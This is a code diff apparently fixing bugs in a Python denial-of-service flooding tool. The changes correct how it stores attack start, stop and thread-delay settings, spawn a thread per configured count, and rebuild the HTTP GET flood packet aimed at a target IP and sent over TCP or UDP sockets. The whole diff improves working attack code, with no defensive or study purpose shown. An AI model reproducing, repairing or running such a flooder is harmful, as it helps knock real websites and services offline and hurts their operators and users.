@@ -280,7 +280,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		try:
 			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
 			for port in var.port:
-				if type(port) == type(1):
+				if isinstance(port, int):
 					print("Entered ports cannot be used.")
 		except Exception as e:
 			print("There was an error while executing.", e)
@@ -304,7 +304,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_step(command):
 		print(" ")
 		try:
-			autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
+			var.autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -313,7 +313,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_start(command):
 		print(" ")
 		try:
-			autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
+			var.autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -322,7 +322,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def auto_stop(command):
 		print(" ")
 		try:
-			autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
+			var.autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
 		except Exception as e:
 			print("There was an error while executing.", e)
 		print(" ")
@@ -354,7 +354,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print(" ")
 		sleep(2)
 		while True:
-			for thread in var.threads:
+			for thread in range(var.threads):
 				try:
 					t = Thread(target=self.ddos)
 					t.start()
@@ -373,7 +373,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def ddos(self):
 		var.runactive = True
 		mesalready = False
-		packet = ("GET HTTP/1.1\nHost: %s\n\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n%s" % (var.ip, var.message)).encode("utf-8")
+		packet = ("GET /%s HTTP/1.1\nHost: %s\n\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n%s" % (var.ip, var.ip, var.message)).encode("utf-8")
 		if not var.outtxtmute:
 			print("Thread started!")
 		if var.socketmethod == "UDP":
